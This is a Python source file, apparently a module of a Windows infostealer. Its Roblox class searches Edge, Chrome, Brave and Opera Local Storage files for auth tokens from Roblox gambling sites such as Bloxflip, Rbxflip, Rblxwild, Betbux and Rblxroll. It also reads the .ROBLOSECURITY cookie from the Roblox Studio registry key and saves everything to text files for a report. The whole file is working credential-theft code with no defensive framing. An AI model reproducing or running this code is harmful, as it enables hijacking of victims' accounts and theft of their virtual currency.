class Roblox:

    def __init__(self):
        os.mkdir(os.path.join(P4THF0LDR, "Roblox"))
        self.robloxfolder = os.path.join(P4THF0LDR, "Roblox")
        self.Rblxwild_file=open(self.robloxfolder+"\\Rblxwild_Tokens.txt","w+")
        self.Rblxroll_file=open(self.robloxfolder+"\\Rblxroll_Tokens.txt","w+")
        self.Betbux_file=open(self.robloxfolder+"\\Betbux_Tokens.txt","w+")
        self.Rbxflip_file=open(self.robloxfolder+"\\Rbxflip_Tokens.txt","w+")
        self.Bloxflip_file=open(self.robloxfolder+"\\Bloxflip_Tokens.txt","w+")
        self.bloxflip = 0
        self.robloxcookies = 0
        self.rbxflip = 0
        self.rblxwild = 0
        self.betbux = 0
        self.rblxroll = 0
        self.content = """
``|_`` :open_file_folder: ``Roblox``"""
        self.paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
        self.profs = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        self.RobloxStudio()
        for pvth in self.paths:
            if "Opera Software" in pvth:
                try:
                    self.Rblxwild(os.path.join(pvth, "Local Storage", "leveldb"))
                except:
                    pass
            else:
                for prof in self.profs:
                    try:
                        self.Rblxwild(os.path.join(pvth,prof, "Local Storage", "leveldb"))
                    except:
                        pass
        for pvth in self.paths:
            if "Opera Software" in pvth:
                try:
                    self.Rbxflip(os.path.join(pvth, "Local Storage", "leveldb"))
                except:
                    pass
            else:
                for prof in self.profs:
                    try:
                        self.Rbxflip(os.path.join(pvth,prof, "Local Storage", "leveldb"))
                    except:
                        pass
        for pvth in self.paths:
            if "Opera Software" in pvth:
                try:
                    self.Bloxflip(os.path.join(pvth, "Local Storage", "leveldb"))
                except:
                    pass
            else:
                for prof in self.profs:
                    try:
                        self.Bloxflip(os.path.join(pvth,prof, "Local Storage", "leveldb"))
                    except:
                        pass
        for pvth in self.paths:
            if "Opera Software" in pvth:
                try:
                    self.Betbux(os.path.join(pvth, "Local Storage", "leveldb"))
                except:
                    pass
            else:
                for prof in self.profs:
                    try:
                        self.Betbux(os.path.join(pvth,prof, "Local Storage", "leveldb"))
                    except:
                        pass
        for pvth in self.paths:
            if "Opera Software" in pvth:
                try:
                    self.Rblxroll(os.path.join(pvth, "Local Storage", "leveldb"))
                except:
                    pass
            else:
                for prof in self.profs:
                    try:
                        self.Rblxroll(os.path.join(pvth,prof, "Local Storage", "leveldb"))
                    except:
                        pass
        if self.robloxcookies > 0:
            self.content += f"""
``|   |_``:page_facing_up: ``({self.robloxcookies}) Roblox_Cookies``"""
        if self.bloxflip > 0:
            self.content += f"""
``|   |_``:page_facing_up: ``({self.bloxflip}) Bloxflip_Tokens``"""
        if self.rbxflip >0:
            self.content += f"""
``|   |_``:page_facing_up: ``({self.rbxflip}) Rbxflip_Tokens``"""
        if self.rblxwild > 0:
            self.content += f"""
``|   |_``:page_facing_up: ``({self.rblxwild}) Rblxwild_Tokens``"""
        if self.betbux >0:
            self.content += f"""
``|   |_``:page_facing_up: ``({self.betbux}) Betbux_Tokens``"""
        if self.rblxroll >0:
            self.content += f"""
``|   |_``:page_facing_up: ``({self.rblxroll}) Rblxroll_Tokens``"""
        if self.bloxflip+self.robloxcookies+self.rbxflip+self.rblxwild+self.betbux+self.rblxroll == 0:
            self.content += f"""
``|   |_``:x: ``No Roblox Data Found``"""
        self.Rblxwild_file.close()
        self.Rblxroll_file.close()
        self.Betbux_file.close()
        self.Rbxflip_file.close()
        self.Bloxflip_file.close()

    def Rblxroll(self,pvth):
        try:
            for f in os.listdir(pvth):
                if f.endswith(".log") or f.endswith(".ldb"):
                    try:
                        file = open(pvth+"\\"+f,'r',errors="ignore").read()
                        if "https://www.rblxroll.com" in str(file) or "https://rblxroll.com" in str(file) or "rblxroll.com" in str(file):
                            rblxrollsplit = file.split("rblxroll.com")
                            for tokens in rblxrollsplit:
                                try:
                                    tok = tokens.split("token")[1]
                                    t=str(re.findall(r"[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\b",tok)[0])
                                    if len(t) > 100:
                                        self.rblxroll += 1
                                        self.Rblxroll_file.write(f"\n(Local Storage) token : {t}\n\n"+"-"*35)
                                except:
                                    pass
                    except:     
                        pass
        except:
            pass

    def Betbux(self,pvth):
        try:
            for f in os.listdir(pvth):
                if f.endswith(".log") or f.endswith(".ldb"):
                    try:
                        file = open(pvth+"\\"+f,'r',errors="ignore").read()
                        if "https://www.betbux.gg" in str(file) or "https://betbux.gg" in str(file) or "betbux.gg" in str(file):
                            betbuxsplit = file.split("betbux.com")
                            for tokens in betbuxsplit:
                                try:
                                    t="DO_NO_SHARE_THIS_|"+str(re.findall(r"(?<=DO_NO_SHARE_THIS_\|)\b[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\b",tokens)[0])
                                    if len(t) > 100:
                                        self.Betbux_file.write(f"\n(Local Storage) betbux_cookie : {t}\n\n"+"-"*35)
                                        self.betbux += 1
                                except:
                                    pass
                    except:
                        pass
        except:
            pass

    def Rblxwild(self,pvth):
        try:
            for f in os.listdir(pvth):
                if f.endswith(".log") or f.endswith(".ldb"):
                    try:
                        file = str(open(pvth+"\\"+f,"rb").read().strip())
                        file = file.split("_https://rblxwild.com")
                        for tok in file:
                            t = "bd"+tok.split("authToken")[1].split("bd")[1].split("\\x")[0]
                            if len(t)>50:
                                self.rblxwild += 1
                                self.Rblxwild_file.write(f"\n(Local Storage) authToken : {t}\n\n"+"-"*35)
                    except:
                        pass
        except:pass

    def Rbxflip(self,pvth):
        try:
            for f in os.listdir(pvth):
                if f.endswith(".log") or f.endswith(".ldb"):
                    try:
                        file = str(open(pvth+"\\"+f,"rb").read().strip())
                        if "https://www.rbxflip.com" in file or "https://rbxflip.com" in file or "rbxflip.com" in file:
                            try:
                                file2 = file.split("rbxflip.com")
                                for tok in file2:
                                    try:
                                        t="eyJhbGciOiJIUzI1NiJ9."+str(re.findall(r'\b[A-Za-z0-9_-]{2000,2300}\b\.[A-Za-z0-9_-]+',tok)[0])
                                        if len(t) > 2000:
                                            self.rbxflip += 1
                                            self.Rbxflip_file.write(f"\n(Local Storage) accessToken : {t}\n\n"+"-"*35)
                                    except:
                                        pass
                            except:
                                pass
                    except:
                        pass
        except:pass

    def Bloxflip(self,pvth):
        try:
            for f in os.listdir(pvth):
                if f.endswith(".log") or f.endswith(".ldb"):
                    try:
                        file = str(open(pvth+"\\"+f,"rb").read().strip())
                        file2 = file.split("_DO_NOT_SHARE_BLOXFLIP_TOKEN")
                        for tok in file2:
                            try:
                                t = "ywmz0d/"+tok.split("ywmz0d/")[1][:2000].split("\\x")[0].replace("%","")
                                self.bloxflip += 1
                                self.Bloxflip_file.write(f"\n(Local Storage) _DO_NOT_SHARE_BLOXFLIP_TOKEN : {t}\n\n"+"-"*35)
                            except:
                                pass
                    except:
                        pass
        except:pass

    def RobloxStudio(self):
        filo=open(self.robloxfolder+"\\Roblox_Cookies.txt","w+")
        try:
            robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
            count = 0
            while True:
                name, value, type = EnumValue(robloxstudiopath, count)
                if name == ".ROBLOSECURITY":
                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
                    self.robloxcookies += 1
                    filo.write(f"\n(Cookies) .ROBLOSECURITY : {value}\n\n"+"-"*35)
                count = count + 1
        except WindowsError:
            pass
        filo.close()
    
    def __repr__(self):
        return self.content